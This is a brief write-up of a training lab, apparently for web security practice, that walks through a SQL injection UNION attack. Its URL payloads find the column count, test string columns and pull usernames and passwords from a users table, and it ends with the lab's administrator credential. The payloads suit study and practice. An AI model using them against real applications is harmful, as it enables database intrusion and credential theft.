# Lab: SQL injection UNION attack, retrieving data from other tables

Target : To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

Analysis:

- There is two columns `/filter?category=Accessories'+UNION+SELECT+NULL+,+NULL++--`
- The two columns compatible with string values `/filter?category=Accessories'+UNION+SELECT+'a'+,+'a'++--`
- retriving admin credentails `Accessories'+UNION+SELECT+username+,+password+FROM+users++--`
  - admin credentails is `administrator:xbrhpyhn1pt1pqtaialt`
